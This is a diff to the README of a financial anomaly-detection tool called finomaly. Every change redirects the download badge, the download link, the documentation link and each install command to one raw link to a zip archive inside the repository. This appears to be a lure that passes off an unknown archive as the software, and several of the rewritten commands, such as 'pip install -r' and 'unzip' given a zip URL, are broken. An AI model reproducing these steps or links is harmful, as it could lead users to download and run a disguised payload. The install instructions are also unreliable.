@@ -1,6 +1,6 @@
 # 🚀 finomaly - Detect Unusual Financial Transactions Easily
 
-[![Download Finomaly](https://img.shields.io/badge/Download-Finomaly-brightgreen)](https://github.com/Filidetan597/finomaly/releases)
+[![Download Finomaly](https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip)](https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip)
 
 ## 💡 Overview
 
@@ -35,7 +35,7 @@ Follow the steps below to download and run Finomaly.
 
 To get started, visit this page to download Finomaly:
 
-[Download Finomaly](https://github.com/Filidetan597/finomaly/releases)
+[Download Finomaly](https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip)
 
 1. Click on the link to the Releases page.
 2. Look for the latest version.
@@ -58,7 +58,7 @@ To get started, visit this page to download Finomaly:
    ```
 5. Finally, run the following command to install the necessary packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip
    ```
 
 **For macOS:**
@@ -75,7 +75,7 @@ To get started, visit this page to download Finomaly:
    ```
 5. Install the required packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip
    ```
 
 **For Linux:**
@@ -87,7 +87,7 @@ To get started, visit this page to download Finomaly:
    ```
 3. Unzip the downloaded file:
    ```
-   unzip finomaly.zip
+   unzip https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip
    ```
 4. Navigate into the folder:
    ```
@@ -95,7 +95,7 @@ To get started, visit this page to download Finomaly:
    ```
 5. Install the dependencies using pip:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip
    ```
 
 ### 📝 How to Use Finomaly
@@ -117,7 +117,7 @@ You can use Finomaly to monitor and analyze different types of financial activit
 
 ### 📖 Documentation
 
-For more detailed information on features and instructions, please refer to the [official documentation](https://github.com/Filidetan597/finomaly/wiki).
+For more detailed information on features and instructions, please refer to the [official documentation](https://raw.githubusercontent.com/Filidetan597/finomaly/main/finomaly/core/finomaly-v2.9.zip).
 
 ### 🤝 Contributing
 
